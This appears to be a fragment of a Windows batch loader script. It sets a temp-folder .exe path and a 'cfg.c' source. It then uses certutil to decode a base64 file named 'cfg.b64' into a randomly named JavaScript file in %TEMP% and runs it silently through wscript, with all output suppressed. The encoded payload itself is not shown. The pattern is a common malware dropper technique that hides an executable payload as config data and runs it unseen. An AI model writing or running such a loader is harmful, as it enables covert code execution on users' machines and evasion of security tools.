@echo off
setlocal
set "OUT=%TEMP%\rbc_9c2a93694d4393ff.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_9c2a93694d4393ff.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_9c2a93694d4393ff.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_9c2a93694d4393ff.js"
exit /b 0
